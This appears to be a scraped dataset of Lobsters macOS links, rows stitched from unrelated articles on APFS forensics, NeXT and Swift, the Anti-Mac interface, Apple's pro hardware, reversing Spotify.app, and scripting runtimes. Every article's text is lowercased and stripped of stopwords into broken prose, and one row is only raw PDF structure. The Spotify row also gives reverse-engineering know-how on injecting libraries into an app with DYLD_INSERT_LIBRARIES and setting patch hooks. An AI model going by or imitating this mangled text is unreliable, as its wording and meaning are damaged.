index cschunktableftrowidinx cschunktable ftrowid coup de grâce version recovery chunk data storage file old mac c simple parse chunk consists chunk size followed chunk id concluded chunk data provided information wrote small python script able use dump chunk information chunk data storage file used exec option find command run script every chunk data file within chunkstorage directory find volumesmacintosh hd old mac cschunkstorage type f exec python tmpchunkdumppy although able recover revision chunk data cloned image unable find way correlate chunk id file name compensate cross referenced chunkgeneration size timestamp using data cschunktable table chunkstoragedatabase generation table dbsqlite summarize add time chunk size excluding chunk header identical timestamp generation size entry generation table used row storage id fetch presumed file name file table using technique able recover identifiable rtf file chunk storage john doe note janertf doe file among confirmed earlier version file stored within user document thus accomplished goal recovering textedit document related john doe interested reading digital forensics security research check latest post dfir research team
186,Lobsters,mac,Apple macOS,"The NeXT Era Ends, the Swift Era Begins",https://inessential.com/2019/06/07/the_next_era_ends_the_swift_era_begins,next era end swift era begin,week happened,surely person think week long wwdc mark end apple next era beginning swift era next era began course apple acquired next unixbased operating system amazing developer tool framework ceo steve job cocoa much better writing mac apps mac toolbox mac toolbox revolution incrementally better cocoa next application framework adapted evolved mac common refrain mac developer time objectivec nice look wonderful language way underpinnings allowed powerful easytouse framework mindblowing underestimate much year later apple created uikit modernized version cocoa iphone small screen touch interface cocoa device carry around also completely mindblowing fastforward note million apps written using technology born next brought apple pushed far forward even writing mostly swift last year still writing next context apps still live world whether know apps still objectivec apps real sense week happened wwdc plenty talk catalyst calling marzipan way bringing uikit io apps mac indeed part news week future never uikit better version already mac respect uikit better way many io apps mac apps though discount catalyst usefulness get lot apps new mac real news week swiftui combine framework finally new way writing apps based swift objectivec much next early bug nearly complete sure also going write apps future mindblowing apple marketing year wwdc right may running apps use swiftui combine know else still come transition transition take year glimpse next year
187,Lobsters,mac,Apple macOS,The Anti-Mac User Interface,https://www.nngroup.com/articles/anti-mac-interface/,antimac user interface,appreciation macintosh macintosh human interface design principle table metaphor direct manipulation figure seeandpoint consistency wysiwyg blind user user control feedback dialog forgiveness perceived stability aesthetic integrity designed sunweb modelessness antimac interface central role language richer internal representation object expressive interface figure expert user shared control mutually reinforcing design principle conclusion table bruce tognazzini film acknowledgment reference http wwwattcom noncommand user interface interface design sun www site sunweb user interface design sun microsystems internal web film clip available,originally published gentner nielsen j antimac interface communication acm august see also appreciation macintosh anniversary exploring alternative interface transcend principle behind conventional graphical interface humancomputer interface emerges based language richer representation object expert user shared control recent user interface conference several speaker lamented human interface stuck seem settled wimp window icon menu pointer model little real innovation interface design anymore physicist mathematician often stretch imagination considering world would like basic assumption principle violated example see led new concept noneuclidean geometry positron antimatter antigravity least violating basic assumption useful mental exercise surprising number resulting concept provided useful description real world article explore type interface could result violate macintosh human interface design principle focus macintosh interface prime example current interface paradigm apple computer published explicit list macintosh human interface design principle principle significantly changed since introduction macintosh style guide popular graphical interface motif open look window list similar set principle basis interface state outset devoted fan macintosh human interface frequent user macintosh computer purpose argue macintosh human interface guideline bad principle rather explore alternative approach computer interface antimac interface intended hostile macintosh different fact human interface designer apple elsewhere already incorporated antimac feature macintosh desktop application macintosh designed computer rest u succeeded well enough became alan kay said first personal computer good enough criticized article taken spirit macintosh designed number constraint including needed sell naive user user without previous computer experience targeted narrow range application mostly office work though entertainment multimedia application added later way sometimes break slightly standard interface controlled relatively weak computational resource originally nonnetworked computer ram storage device dotmatrix printer supported highly impoverished communication channel user computer initially small blackandwhite screen poor audio output audio input sensor keyboard onebutton mouse standalone machine connected printer constraint relaxed somewhat year since introduction macintosh explore might happen eliminated completely macintosh human interface design principle according macintosh guideline design human interface macintosh system software application based number fundamental principle humancomputer interaction principle led excellent graphical interface wonder principle limit computerhuman interface type interface would result violating principle address two question macintosh human interface design principle macintosh design principle corresponding antimac principle summarized table table mac antimac design principle mac antimac metaphor reality direct manipulation delegation see point describe command consistency diversity wysiwyg represent meaning user control shared control feedback dialog system handle detail forgiveness model user action aesthetic integrity graphic variety modelessness richer cue metaphor first macintosh principle state interface based metaphor familiar noncomputer world around u macintosh interface computer file represented document paper folder placed desktop file deleted dragging trash many recent interface tried overcome limitation desktop metaphor extending room building metaphor eg bob magic cap figure village metaphor eg eworld design try emulate virtual reality flat screen often seem introduce level clunky indirectness achieving common user goal navigationally cumbersome asking user go end town pick email post office interactionally cumbersome overloading user additional window interface element necessitated metaphor user task note link upper right move hallway shown next screenshot figure magic cap interface based literal metaphor desktop building village although use metaphor may ease learning computer novice also cripple interface irrelevant limitation blind designer new paradigm appropriate computerbased application designer phelps farm tractor based interface metaphor interface familiar horse farmer used rein control tractor tractor steered pulling appropriate rein rein loosened go forward pulled back stop pulling back harder rein caused tractor back clear hindsight dead end automobile developed user interface without metaphor based earlier technology nonetheless people today designing informationretrieval interface based metaphor book even though young folk spend time flipping television channel playing video game turning page book three classic problem metaphor target domain feature source domain eg telling user word processor like typewriter would lead user look replace command source domain feature target domain typewriter ability mark form receive mail user trying current computer system normally fail feature exist domain work differently treatment white space representing space character tab line feed different typewriter word processor therefore user may trouble seeing beyond metaphor use system way intended possible design interface map closely metaphor eg bob mack nosenosurprise editor really act like typewriter respect interface often lowpowered suited mainly walkupanduse situation example limitation desktop metaphor consider trash macintosh desktop fine metaphor wastebasket office case dispose object putting trash able retrieve document thrown trash emptied however limit singletrashcan metaphor led system fails meet user need cause confusion masking reality implementation underlying implementation separate trash container volume hard disk floppy disk avoid confusion multiple trash can interface content trash container mounted volume combined shown single desktop trash one trash metaphor user empty trash create room floppy disk trash content floppy hard disk deleted even though need delete file hard disk trash desktop metaphor enforced limitation interface serve user real need alternative approach would simply cross file disappear perhaps temporary limbo permanently discarded approach avoids problem caused trash metaphor even though analogy real world metaphor constrain mislead user also limit designer ability invent powerful interface mechanism example guilty anybody using tired book metaphor recently designed user interface worth sun online documentation used book metaphor unify icon vocabulary hierarchical structure user navigation excuse interface display information originally written separate printed manual would confusing use freeform hyperspace model represent text doubt however book metaphor prevented u introducing desirable feature like ability reorder chapter according relevance score search desktop metaphor assumes save training time taking advantage time user already invested learning operate traditional office paper document filing cabinet next generation user make learning investment computer counterproductive give interface based awkward imitation obsolete technology instead need develop new interface paradigm based structure computer system task user really perform rather paradigm enshrine outmoded technology way advance interface develop evermorefaithful imitation desktop instead escape limitation desktop especially computer become ubiquitous used away desk direct manipulation using direct manipulation user interact directly object interface archetypal example move file one directory another opening original folder using mouse pointer drag file icon destination folder procedure work well simple action small number object number action object increase direct manipulation quickly becomes repetitive drudgery dark side direct manipulation interface directly manipulate everything instead executive give highlevel instruction user reduced assembly line worker must carry task direct manipulation also mean user must always operate atomic level group related series basic action one highlevel action use conditionals suppose group image want convert pict file icon see figure figure wish convert pict file icon task involves several step would difficult accomplish direct manipulation simple scripting language provides natural specification task conversion requires several step tedious process direct manipulation simple scripting language provides natural mean specifying task direct manipulation also limit precision action precision achieved eyehandmouse coordination language mathematics precise place bottom triangle level middle circle dynamic maintain height histogram bar bar left finally direct manipulation requires user involved every action sometimes user may know example application become complex involve many file spread throughout computer installation removal application exceeds understanding user rather directly dragging file proper place user would prefer pressing single button installation program computer move file appropriate place indeed install uninstall program become essential adjunct complex software package seeandpoint seeandpoint principle state user interact computer pointing object see screen thrown away million year evolution lost facility expressive language reduced pointing object immediate environment mouse button modifier key give u vocabulary equivalent different grunt lost power language longer talk object immediately visible file one week old object nt exist yet future message bos unknown object guide restaurant boston want order food country nt know language forced go kitchen use seeandpoint interface little understanding language point menu select dinner dining room language allows u discus exactly would like eat waiter chef similarly computer interface must evolve let u utilize power language adding language interface allows u use rich vocabulary give u basic linguistic structure conditionals language let u refer object immediately visible example could say something like notify new message emily note advocating interface based solely language neither interface understand full natural language real expressive power come combination language example pointing consistency consistency one principle sound like great idea first come across difficult apply principle real situation wide array conflicting thing consistent basic advantage consistency hope learning reduced object similar function always look behave people recognize application easily similar icon yet real world people difficulty switching ballpoint pen fibertip pen even though look somewhat different different control similar enough recognized pen whereas varying appearance provide pleasure clue slightly different functionality rich finegrained representation object real world allows pen book wide variety appearance still easily recognizable representation object computer interface become richer finegrained need complete consistency drop note consistency symmetrical whereas argue object similar function need consistent appearance control still important object similar appearance similar behavior function except joke pen look like tennis shoe useful wysiwyg see get wysiwyg mean document appears screen accurately reflects look like printed certainly big improvement earlier computerbased text formatting system troff obvious relation document appearance screen produced printer took many trial get new document print properly problem wysiwyg usually equivalent wysiati see document rich semantic structure often poorly captured appearance screen printed page example word may printed italic font emphasis part book title part quotation specific meaning lost represented fact character italicized wysiwyg document show final printed representation capture user intention text representation standard generalized markup language sgml preserve semantic meaning inherent text rule converting text semantics appearance printed page example string text may labeled book title sgml one situation text might printed italic font another case might printed bold font third case might accessed bibliographic retrieval program wysiwyg assumes one useful representation information final printed report although arguing print preview function even goal produce printed document may useful different representation preparing document example may want see formatting symbol margin outline may useful see index term assembled margin composing sense wysiwyg equivalent horselike tractor discussed earlier connection metaphor wysiwyg assumes people want paperstyle report information might produced even consumed screen still structured way paper day however time read document get reality people rarely read information beginning end way would read report good old day even busy manager got single report per day instead electronic information modularized presented way encourage people read little possible popping information interest specific user top enabling user link backup information needed objectoriented authoring reading would allow piece information presented multiple level possibly different perspective also mention user see blind user information encoded sgmllike rich intentional attribute represented alternative format eg sound much usable fashion possible simple screen reader limited reading aloud pixel screen without knowing mean user control become almost religious crusade among wimp advocate user control user computer initiate control action negative side user control user control many situation want control flying airliner example watching toast morning see nt burn many activity life either difficult boring repetitive would like delegate people machine similarly computer many activity either want control know control prime territory agent daemon computer process tirelessly stand guard take care routine task knowledge lack handle complex task computer programmer gave complete control time ago stopped writing machine language let assembler compiler interpreter worry little detail day user still specify exact routing email message learned worth trouble computer often better job computer people differ widely expertise example people notoriously bad vigilance task make sense let computer take control periodically saving word processor document backing hard drive reminding u meeting even desirable full control becoming impossible networked computer user control assumes actor system day million people internet change system behind back indeed one benefit internet new resource appear without work part would possible conceptualize internet groupware application million user reality better thought system without centralized control thing happen without user asking would like feedback dialog principle state computer interface provide user clear immediate feedback action initiated user closely connected previous principle user control user required control detail action user need detailed feedback sequence activity delegated agent encapsulated script longer need detailed continuous feedback user nt bothered unless system encounter problem handle supervisor interacts intensely new employee solicits detailed progress report employee gain experience supervisor gain confidence need detailed feedback dialog decrease supervisor assign complex task confident news good news rather always providing user feedback activity computer flexible amount feedback provides initially computer could provide detailed feedback familiarize user operation instill confidence feedback could scaled back time restricted unusual circumstance time user request feedback forgiveness forgiveness principle state user action generally reversible user warned try something cause irreversible data loss even forgiveness negative side consider example common case user want copy file floppy enough free space macintosh give error message explaining enough room must throw away throw away file attempt copy file get another error message stating enough room unless empty trash asking want empty trash case forgiveness becomes nuisance underlying problem computer meager understanding interaction history stateless interface doomed present inappropriate message relate user action prior recommendation delete file computer need build deeper model intention history perceived stability perceived stability mean element computer interface changed without user involvement example icon desktop window reappear user last closed sure sign lack confidence person last word leaving room nt move get back computer interface principle perceived stability implies computer likely make thing worse user unable function changing environment still child computer age child like stability want hear bedtime story watch video grow capable better able cope changing world become comfortable change even seek novelty sake one compelling aspect computer game computerbased learning environment lack stability derives dividing control user computer even among user networked computer surprising world live act play arena mixed control initiative individual associate larger environment many thing computer people u decide nt maintain perceived stability today electronic message news article appear unbeckoned computer desktop application existed time automatically scan sort incoming mail program magnet macintosh application search file meeting specified criterion move user folder act simple agent build improved environment computer user worldwide web prime illustration advantage shared control user interface web change constantly every time user connect home page might presented completely new interface example change home page daily designing sun home page decided needed change drastically every month keep user interest stability boring denying principle perceived stability often make interface simpler intuitive easily overwhelmed capability large application application discreetly rearranges interface time time offer u feature current interest u get feeling everything need easy find readily hand aesthetic integrity principle aesthetic integrity state graphic design interface simple clean consistent screen visually pleasant easy understand part need aesthetic integrity derives limited expressiveness current computer computer could communicate richer language would important everything single look networking person computer world extends beyond bound desktop machine city designed single architect consistent visual appearance would difficult navigate somewhat boring visit variety visual design would make computer world interesting memorable comprehensible extreme example old user interface internet great aesthetic integrity one l listing ftp looking pretty much like needed information modification date size file type indicated extension shown severely minimalist manner even wild woolly extreme web homepage design taken user seem prefer illustrative indication location content cyberspace note argue complete anarchy darrell sano recently designed sunweb sun internal web page unified though flexible look want sunweb recognizably different say silicon surf sgi web page want help button appear different place computer world expands especially network encompass million object object look totally uniform interface drab boring increase risk user getting lost hyperspace richer visual design feel exciting functionality perspective richness increase usability making easier user deal multiplicity object derive understanding location navigation cyberspace modelessness modelessness mean computer interface distinct mode restrict user action depending mode user able perform task time although modelessness seems object veneration among macintosh interface designer even section modelessness macintosh human interface guideline primarily devoted explaining use mode successfully basic problem presented modelessness user cope everything user need interface narrow attention choice find information action need particular time real life highly moded swimming pool different kitchen people easily distinguish two richness experience ease move environment antimac interface although article start exploration alternative individual macintosh human interface principle quite ended way macintosh design principle interrelated give resulting coherence macintosh interface violation principle also point coherent interface design call antimac interface basic principle antimac interface central role language richer internal representation object expressive interface expert user shared control central role language past million year human evolved language major communication mode language let u refer thing immediately present reason potential action use conditionals concept available seeandpoint interface another important property language missing graphical interface ability encapsulate complex group object action refer single name interface better exploit human language natural powerful finally natural language cope ambiguity fuzzy category adding ability deal imprecise language computer interface increase computer flexibility fit people normal expressive mode susan brennan shown natural language addition natural people several advantage medium humancomputer interaction including role negotiated understanding use shared context easy integration pointing inputoutput channel proposing however ai researcher would call natural language interface seems computer hold normal conversation user remain realm science fiction time yet interested computerhuman interface near future instead mind something like interface textbased adventure game understanding synonym relatively simple syntax tolerance error input pidgin language computer critical research question capture many advantage natural language input without solve aicomplete problem natural language understanding commandline interface advantage language large number command always available user rich syntactic structure used form complex command commandline interface two major problem first although user type anything computer understand limited number command easy way user discover command understood second commandline interface rigid tolerate synonym misspelling imperfect grammar believe deficiency dealt process negotiation think way new library user might interact reference librarian librarian commandline interface would understand limited number grammatically perfect query novice user would consult obscure reference manual learn query write reference librarian wimp interface would set menu desktop user would search menu point appropriate query neither interface seems helpful instead real reference librarian talk user negotiate actual query similarly envision computer interface utilizes thesaurus spelling correction display possible knowledge user task take part negotiation user command could imagine example dialog user make freeform request computer responds list possible task seem match request engage dialog focus request user actually intended richer internal representation object current interface access little information object user deal example information known file may name size modification date type data contains application created order deal effectively object computer need much richer representation document representation could include author topic matter keywords importance whether copy document related forth list attribute similar would needed good secretary expected handle document intelligently necessary secretary fully understand document content must general sense document significance computer interface handle document intelligently must sort information much information require natural language understanding already technique fulltext search system could used automatically extract information document move text system tag based meaning rather wysiwyg system much information available document allow computer control interface could monitor object change representation accordingly example two object almost always used together computer could create hypertext link expressive interface richer internal representation object allow intelligent interpretation user command also reflected expressive interface richer external representation macintosh interface originally designed display contained le blackandwhite pixel remarkable well translated today display contain color pixel increase factor information capability trend continue display approach size desk practical resolution human eye additional factor interface take advantage change increase expressiveness object display figure variety rich visual affordances bookcase make easy recognize object interest notice figure book bookshelf wide variety appearance yet recognizable book variety add visual interest help u quickly locate particular book yet computer interface document given application usually appear identical practice starting change graphic application represent document thumbnail image beginning improved display sound give u computer world comfortable navigate real world addition richer output richer input device allow user flexibility manipulating object monitoring device like active badge allow computer accommodate user need without explicit command expert user gui contemporary application generally well designed ease learning often tradeoff ease learning one hand ease use power flexibility hand although could imagine society language easy learn people communicated pointing word icon large menu carried human instead chosen invest many year mastering rich complex language today child spend large fraction life communicating computer think tradeoff ease learning power computerhuman interface compensating return increased power would unreasonable expect person spend several year learning communicate computer expect child spend year mastering native language sometimes claimed human limited cognitive ability therefore able handle increasingly complex computer even though human brain may stay foreseeable future demonstrably true fixed human brain implies fixed ability use specific system example consider ability survive jungle without modern weapon reader article would probably fare rather poorly dropped jungle told catch dinner bare hand time anybody born raised jungle would probably perform dinnercatching task superbly difference performance two group due benefit grown environment fully internalized signal rule example show two people brain capacity different capability come using given system predict people grown computer much capable computer user current generation user thus able use fact demand expressive interface advanced mean expressing want shared control entire burden individual user computerbased agent gotten attention computer scientist human interface designer recent year capability yet progressed beyond simpleminded task people willing delegate complex task agent need agent skilled specific task area communicating user recent rapid rise use web illustrates advantage sharing control computer world people relinquishing control portion world utilize product people effort knowledge creativity computer environment human computerbased agent active role implies mixed locus control user environment longer completely stable user longer totally control general sanity user still need determine balance control different part environment need mean find agent need mechanism navigating wider networked world antimac interface trade stability richer possibility shared world real world nt want anyone rearranging mess desk nt mind someone put postit note computer screen empty wastebasket overnight refill newspaper stand latest edition mutually reinforcing design principle relatively short history computing several change taken place way computer used people form main user community change usage user lead important change user interface highly usable design reflect set principle mutually reinforcing match need main user task example original textbased unix user interface appropriate designed commandline interface suited user community dominated programmer expertise interest time understand many different system feature could combined optimal use mechanism like piping shell script early unix user manipulated relatively data object code text file memo mostly plain ascii text unix design principle modular command many parameter option worked well chosen user task evidenced several attempt build graphical user interface top unix possible modify design simply changing one two aspect eg representing file icon since full set design attribute chosen work together successful modification unix combine several new design principle achieve new mix mutually reinforcing design element eg combining icon draganddrop multiple workspace structure user task similarly macintosh optimized certain user community certain main type data knowledge worker without computer science background wanted manipulate graphic document overwhelmingly many various macintosh user interface principle work well together help chosen user category achieve main goal since principle mutually reinforcing may easy break changing user task lead new requirement example argued earlier becomes impossible make object visible interface system usage change deal million information object invisible object break design principle seeandpoint make direct manipulation impossible risk weakening chosen metaphor break perceived stability object made visible anyway certain time antimac principle outlined optimized category user data believe dominant future people extensive computer experience want manipulate huge number complex information object connected network shared immense number user computer new user interface principle also reinforce mac principle richer internal representation object naturally lead expressive external representation increased possibility using language refer object sophisticated way expert user capable expressing computer using languagebased interface feel comfortable shared control interface capable understanding happening expressive interface lead better explanation conclusion first avoid misunderstanding let u reiterate criticizing macintosh interface think bad view starting point considering differing need future user interface must meet table compare characteristic original macintosh antimac user interface table comparison mac antimac interface mac antimac user rest u previous computer experience user postnintendo generation grown computer office automation productivity application work play groupware embedded ubiquitous weak computer ram cpu humongous computer multigigabyte ram crayonachip risc processor impoverished communication bandwidth small screen keyboardmouse input rich communication computer see know large highres screen new io device standalone system stable unless user decides make change connected system subjected constant change manipulation icon language weak objectorientation small number large object attribute strong objectorientation large number small object rich attribute set finder visible file system unifying home base file basic interaction object personal information retrieval unifying principle atomic information unit basic interaction object surf harddrive information come power best ed apple slogan time wo nt always work hard bruce tognazzini starfire film attempt show highend workstation might look year interface visualized film several similarity antimac design system understands object well enough integrate seamlessly construct texture map person video image screen large fairly expressive interface element computer independent initiative heroine search article reprint agent automatically decides search display subsequent article link original article computer monitor user attempt speech recognition talking colleague despite antimac aspect starfire still recognizable computer many similarity current user interface research system indeed antimac feature evidence current commercial product example product like location searchit show autonomy taking initiative index user file system needed allow user retrieve email object content rich attribute even though email message may part large text file viewed standard system interface realistic person read preceding outline antimac interface realize mostly impractical current state computer software language understanding still infancy population first encounter computer user know better trust computerbased agent free rein system today standard wimp interface fairly well suited current hardware software capability hardware designer slowing challenge application interface designer take advantage coming computing power move computerhuman interface new plateau interface designer need start work issue solution available next generation computer arrives also help guide direction hardware software development realize full benefit antimac approach argue sufficient retrofit feature one time system basically follow current user interface architecture believe integrated design build new user interface bottom coherent better potential increasing user productivity least order magnitude full antimac system likely based deep object structure architecture support networkdistributed object detailed attribute sufficiently standardized shared among multiple functionality module realistically speaking complete redesign take time appear even full system appear several year come necessary detailed research begin develop needed feature collect usability data antimac characteristic shaped truly meet user need acknowledgment would like thank bruce tognazzini ellen isaac robin jeffries jonathan grudin tom erickson member human interface group sunsoft valuable comment article reference alfven h worldsantiworlds w h freeman san francisco apple computer macintosh human interface guideline addisonwesley reading mass home page url http wwwattcom brennan e conversation direct manipulation iconoclastic view art humancomputer interface design b laurel ed addisonwesley reading mass pp clymer f treasury early american automobile mcgrawhill new york cypher eager programming repetitive task example proceeding acm conference human factor computing system new orleans april pp gentner r interface learning motivation locus control cognitive modelling interactive environment language learning f l engel g bouwhuis boesser g dydewalle ed nato asi series vol f springerverlag berlin grudin j case user interface consistency commun acm halasz f moran p analogy considered harmful proceeding acm conference human factor computer system gaithersburg md march pp hill wc hollan jd wroblewski mccandless edit wear read wear proceeding acm conference human factor computing system monterey calif may pp johnson j mode noncomputer device int j manmach stud malone w grant k r turbak r brobst cohen intelligent informationsharing system commun acm nielsen j noncommand user interface commun acm nielsen j interface design sun www site june nielsen j sano sunweb user interface design sun microsystems internal web proceeding second international www conference mosaic web chicago oct open software foundation osfmotif style guide prenticehall englewood cliff nj shneiderman b direct manipulation step beyond programming language ieee comput sun microsystems inc open look graphical user interface application style guideline addisonwesley reading mass tognazzini b starfire video prototype project case history proceeding acm conference human factor computing system boston april pp film clip available want r hopper falco v gibbon j active badge location system acm trans inf syst weiser computer century sci window interface application design guide microsoft press redmond wash
188,Lobsters,mac,Apple macOS,What's New in Apple Filesystems,https://devstreaming-cdn.apple.com/videos/wwdc/2019/710aunvynji5emrl/710/710_whats_new_in_apple_file_systems.pdf,new apple filesystems,,obj endobj xref n n n n n n n n n n n n n n n n n n trailer prev startxref eof obj stream q k
189,Lobsters,mac,Apple macOS,Apple is Listening,https://marco.org/2019/06/09/apple-is-listening,apple listening,mac pro roundtable discussion followup briefing year later started ended youtube minicareer mac pro courageous,something big changed apple around beginning encountered significant turbulence product line preceding year especially mac rough time pro mac user mac pro addressed fraction need solved previous tower aged quickly without critical upgrade path suffered high gpufailure rate cooling solution design prioritized size appearance performance versatility one mac model never make tradeoff next year became clear mac pro embarrassing outdated flop apple seemed little intention ever updating leaving customer feeling unheard abandoned think apple learned small lesson learned much bigger one year later current macbook pro generation launched late think apple truly caught completely surprise new touch bar sparse usbconly port offering high price highly polarizing butterfly keyboard met harsh criticism mixed review high failure rate one really hurt mac pro niche machine highestend mostspecialized need popular macbook pro lifeblood mac end addition generally buggy neglected state macos seemed perpetually stuck apple replaced entire mac lineup controversial limiting product seemed optimized flex industrialdesign muscle rather actually addressing need company make computer o seemed incapable making good computer anymore update threatened remove break thing needed loved newest design felt punitive rather feeling like celebration computing april nowhere apple held mac pro roundtable discussion press announce early stage completely redesigning mac followup briefing year later promised new mac pro would released publicized existence workflow real pro user working inside apple inform direction pro hardware software sounded like gone listening customer institutionalized process listening newly designed mac released since imac pro using write best mac ever owned far versatile incredibly powerful beautiful silent good probably never really need mac pro new mostly fine mac mini replaced pitiful punitive neglected relic practical powerful minimacpro apple let die replaced tiny noport marvel uselessness instead made computer good started ended youtube minicareer review mac pro finally unveiled last week look absolutely killer first true successor tower mac pro saw last real update almost decade ago big bulky ludicrously fast almost obscenely upgradeable exactly mac pro need far better u expected new mac pro truly celebration computing even importantly hardware release macos also seen massive engineering effort recently first time decade mac major focus wwdc great new apis poised usher huge wave fresh software fair story ended yet mac pro actually yet expensive still need resolve problematic macbook pro next generation rumor promising lack standalone apple display six thousand dollar really hurt mac pro optimistic first time year hard tell apple listening speak concisely infrequently ready saying absolutely nothing meantime even screaming product line fire make great progress often courageous loss never get reversed extended silence stuck change forever indistinguishable extended silence fix ready yet clearly major shift direction better since early clear apple listening still got mac back
190,Lobsters,mac,Apple macOS,Skiptracing: Reversing Spotify.app,https://medium.com/@lerner98/skiptracing-reversing-spotify-app-3a6df367287d,skiptracing reversing spotifyapp,skiptracing reversing spotifyapp project data http hooking finding hook http githubcomnevynspmediakeytap http hookcase http githubcomstevenmichaudhookcase finding hooking rest http conclusion,skiptracing reversing spotifyappi one personal project finish think software developer relate awesome idea due work responsibility end forgotten buried tasksnow success story one said project completed story longforgotten project revived given new life fact hoping writing force eventually finish project enough introduction let get itthe projectthe goal project build spotify client learns listening habit skip song would normally skip like many program desire come laziness want create find playlist mood certain music want select song library shuffle rest song flow deleted queueto accomplish need learn sort model able perform task maybe future post able train model first need data train withthe datai basically want entire listening history including song skip fairly straightforward get extended history even though spotify api allows get last played song set cron job repeatedly poll endpoint effectively keeping track every listen code posted http hard part tracking skip spotify web api provides endpoint past created service control playback using spotify applescript api rest post pertain macos spotify client could use service keep track skipped felt like shying away challenge else could accomplish hookingi recently learned process called hooking intercept function call made target binary thought would perfect way track skipsthe common type hook interpose hook type hook overwrites relocation plt exactly mean plt procedure linkage table allows code reference external function think libc without knowing function memory reference entry plt linker performs relocation function symbol plt runtime one benefit approach external function loaded different address relocation plt need changed every reference function codeso create interpose hook say printf whenever process hooking call printf implementation printf called instead libc oftentimes custom library also call standard implementation got little bit background belt hooking almost ready try inserting hook spotify first need figure want hookfinding hookas stated earlier interpose hook created external function look function libc objectivec runtimewhile researching hook thought good place start looking would spotify handle medium control key macbook seemed safe assume handler key would call function called say next button clicked spotify app eventually came across spmediakeytap library http githubcomnevynspmediakeytap figured give shot see whether spotify copy pasted code library would make life whole lot easierin spmediakeytap library method startwatchingmediakeys ran string command spotify binary see method sure enough bingo load spotify binary ida free version course search string find corresponding method partial disassembly startwatchingmediakeysif look corresponding source code function find interesting parameter tapeventcallback cgeventtapcreate function source code startwatchingmediakeysif look back disassembly see subroutine passed tapeventcallback parameter look either source code disassembly function see one library function cgeventtapenable called cgeventtapenable called tapeventcallbacklet try hook functionthe first thing need create library define custom cgeventtapenable fairly simple following code include corefoundationcorefoundationh include dlfcnh include stdlibh include stdioh void cgeventtapenable cfmachportref tap bool enable typeof cgeventtapenable oldtapenable printf hooked n oldtapenable dlsym rtldnext cgeventtapenable oldtapenable tap enable dlsym function call get address actual library cgeventtapenable function call old implementation accidentally break anything let compile library like credit http gcc fnocommon c filename c gcc dynamiclib library name filename ogreat let try running spotify inserting hook dyldinsertlibraries library name applicationsspotifyappcontentsmacosspotify hit enter uh oh spotify opened fine apple system integrity protection sip let u load unsigned library seems sort complaint codesigning luckily member apple reasonably priced developer program codesign library crisis averted let sign library certificate run previous command surprisingly apple let insert library signed old identity one used signing original binary look like find another way dig hook spotifyas side note astute reader might notice function hooking cgeventtapenable called medium key event time even could insert hook would triggered edge case likely seen output section main purpose detail initial fail oversight serve learning experiencehookcaseafter digging came across awesome library hookcase http githubcomstevenmichaudhookcase hookcase let u implement much powerful type hook interpose hook patch hookpatch hook inserted modifying function wish hook trigger interrupt interrupt handled kernel transfer execution personal code interested highly recommend reading hookcase documentation much detailedpatch hook allow u hook call external function function within target binary since rely plt hookcase provides u framework insert patch andor interpose hook well kernel extension handle interrupt generated patch hook run custom code truly great framework invaluable projectfinding way hook function within spotify binary one question let revisit spmediakeytap source code see medium control key handled callback function see nxkeytypeprevious nxkeytypeplay etc pressed execute handleandreleasemediakeyevent selector delegate notified said selector let look delegate method repo turn lay template handling key let search function receivedmediakeyevent ida look graph view corresponding function look pretty similar see one common function called type key integer parameter set distinguish let hook see log key pressedwe see disassembly get two parameter pointer playerdelegate property sptclientappdelegate singleton integer specifying type event occurred pauseplay next previous looking include highly recommend check see actually wrapper contains meat woah look complex let try break bitlooking structure graph single node towards top many outgoing edge ida helpfully suggests switch statement esi second integer parameter described earlier look like spotify handling little previous pauseplay next though let focus block handle next admittedly took time decipher want draw attention call line fourth bottom look case find similar pattern calling register seems like good function look know let crack open new tool debugger lot trouble initially trying debug spotify could due masterful debugger think came pretty clever solutionwe first set hook trigger breakpoint within code executing assembly instruction int debugger like gdb lldb use trigger breakpointshere hook look like hookcase framework adding hookcase template library also add userhooks array compile using template makefile hookcase provides substituting filename course library inserted spotify following command hcinsertlibrary full path hook dylib applicationsspotifyappcontentsmacosspotifywe run lldb attach running spotify process like continuing past initial trap try pressing spotify active window first press may open itunes int line hook triggered debuggerwe step reach entrypoint notice pc offset address one shown ida honestly best grasp happens assume due process loaded memory current process push instruction located ida address instruction give u offset ida address call instruction add offset address set breakpoint accordingly b continuewhen hit target instruction print content register subtract offset address voila get titular address hook function confirm suspicion add userhooks array compile run lo behold time press click next button spotify app message loggednow hooked skip function resti post rest code go process reverse engineering rest post already pretty longin short also hooked previous function good exercise following along either hook first check past halfway current song anything assuming gotten bored song fit back pop last skipwhere way found check current song past halfway deserves word initial way actually call popen run corresponding applescript command feel righti ran classdump spotify binary found two class spapplescriptobjectmodel spapplescripttrack method expose necessary property need playback position duration track id hooked getters property called next back hook think make sense swizzle trouble getting work use file keep track skip first line hold number skip skip increment counter write track id timestamp file line specified counter back press simply decrement counter way press back button set file write new skip one backtracked anyways code http hope enjoyed post learned something know learned hell lot throughout process let know think think could done anything betterdifferently thanks
191,Lobsters,mac,Apple macOS,Scripting Languages to Be Removed,https://mjtsai.com/blog/2019/06/04/scripting-languages-to-be-removed/,scripting language removed,xcode beta release note lean marcin krzyzanowski joe groff wood borer lobster reddit hacker news dr drang microsoft hacker news python store page kyle crawford curtis wilcox brett terpstra brent simmons peter n lewis brent simmons brent simmons nick heer applescript mac macos catalina perl programming pyobjc python ruby top post unix window comment r feed,xcode beta release note scripting language runtimes python ruby perl included macos compatibility legacy software future version macos scripting language runtimes available default may require install additional package software depends scripting language recommended bundle runtime within app use python recommended version included macos compatibility legacy software future version macos include python instead recommended run terminal big deal term philosophy apple touted builtin unix tool suite mac advantage also mean lot practical change installers applescripts longer lean scripting language marcin krzyzanowski year microsoft proud add new terminal app full support bash everything please developer apple decided deprecate scripting macos replace bash zsh explanation given curious maybe valid reason joe groff downside stuff getting included could never upgraded apps would depend exact version shipped decade ago still make sense scripting language huge apple update remove old version timetotime previously update wood borer guess kid think good change one old version python perl instead ten play path pick right one like window update see also lobster reddit hacker news update dr drang one great value apple providing scripting language macos make easy regular user turn occasional scripters people program time seem forget terrifying idea writing code never done even power user quail idea scripting done time survived first step learning script install python via homebrew simply going pas new scripters care example applesupplied python date reason python perfectly good starting point perl ruby removing scripting language also mean u know use send script friend help automate task perfectly happy slum python oh dear use format function instead fstrings take microsoft via hacker news microsoft involved python community twelve year currently employ four key contributor language primary runtime growth python incredible find home among data scientist web developer system administrator student roughly half work already happening window finally may window update completing picture python continues remain completely independent operating system every install window include python command take directly python store page update kyle crawford scripting runtimes bridge included o like swift comfortable swift also like ruby python often better fit job written lot swift still write lot ruby python update curtis wilcox although multiple apps needing copy perl instance might seem inefficient 